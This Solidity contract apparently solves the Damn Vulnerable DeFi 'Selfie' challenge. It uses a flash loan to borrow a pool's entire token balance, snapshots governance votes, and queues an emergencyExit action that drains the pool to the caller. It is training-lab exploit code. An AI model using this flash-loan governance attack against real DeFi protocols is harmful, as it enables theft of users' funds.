// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";

contract Exploiter is IERC3156FlashBorrower {
    SelfiePool private immutable selfiePool;
    ISimpleGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable token;

    uint256 public actionId;

    constructor(address _selfiePoolAddress, address _tokenAddress) {
        selfiePool = SelfiePool(_selfiePoolAddress);
        governance = ISimpleGovernance(selfiePool.governance());
        token = DamnValuableTokenSnapshot(_tokenAddress);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        selfiePool.flashLoan(this, address(token), token.balanceOf(address(selfiePool)), data);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata data) external returns (bytes32) {
        token.approve(address(selfiePool), token.balanceOf(address(this)));
        token.snapshot();
        actionId = governance.queueAction(address(selfiePool), 0, data);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
